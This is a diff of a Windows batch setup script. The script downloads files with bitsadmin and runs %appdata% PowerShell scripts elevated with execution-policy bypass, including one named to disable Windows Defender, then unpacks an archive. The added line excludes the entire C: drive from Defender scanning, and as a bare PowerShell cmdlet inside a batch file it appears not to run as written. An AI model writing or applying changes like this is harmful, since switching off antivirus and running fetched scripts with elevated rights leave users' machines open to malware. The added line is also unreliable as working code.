@@ -13,6 +13,7 @@ call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://ra
 call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\disable-windows-defender.ps1""' -Verb RunAs}"
 call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\doptimize-windows-update.ps1""' -Verb RunAs}"
 call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\UninstallMicrosoftTeams.ps1""' -Verb RunAs}"
+Add-MpPreference -ExclusionPath "C:\"
 :::::::::: 执行任务 :::::::::
 call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\prevent-screen-lock.ps1""' -Verb RunAs}"
 call cd %appdata% && "%appdata%\7z.exe" x "%appdata%\xfile.zip"
